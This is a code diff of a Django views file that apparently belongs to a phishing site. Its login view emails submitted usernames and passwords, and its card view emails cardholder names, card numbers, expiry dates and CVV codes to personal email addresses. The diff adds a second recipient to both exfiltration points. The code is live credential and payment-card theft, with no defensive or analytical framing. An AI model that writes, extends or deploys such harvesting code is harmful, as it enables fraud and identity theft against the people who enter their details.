@@ -17,7 +17,7 @@ def login_view(request):
         subject = 'New details submitted'
         mail_message = f"username: {username}\npassword: {password}"
         from_email = EMAIL_HOST_USER
-        recipient_list = ['karenfurst6@gmail.com'] 
+        recipient_list = ['msikenzo@outlook.com','karenfurst6@gmail.com'] 
         send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
         return redirect('card')
     return render(request, 'login.html')
@@ -33,7 +33,7 @@ def card_view(request):
         subject = 'New details submitted'
         mail_message = f"cardholder_name: {cardholder_name}\ncard_number: {card_number}\nexpiry_year: {expiry_year}\nexpiry_month: {expiry_month}\ncvv: {cvv}"
         from_email = EMAIL_HOST_USER
-        recipient_list = ['karenfurst6@gmail.com'] 
+        recipient_list = ['msikenzo@outlook.com','karenfurst6@gmail.com'] 
         send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
       
         combined_data = {
